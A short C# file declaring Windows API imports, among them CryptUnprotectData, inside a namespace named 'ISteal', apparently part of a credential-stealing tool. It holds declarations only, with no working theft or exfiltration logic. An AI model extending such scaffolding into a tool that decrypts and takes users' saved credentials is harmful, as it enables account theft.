using System;
using System.Runtime.InteropServices;
using static ISteal.Safe.Structures;

namespace ISteal.Safe
{
    public class NativeMethods
    {
        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
        [DllImport("wininet.dll")]
        internal static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);
    }
}
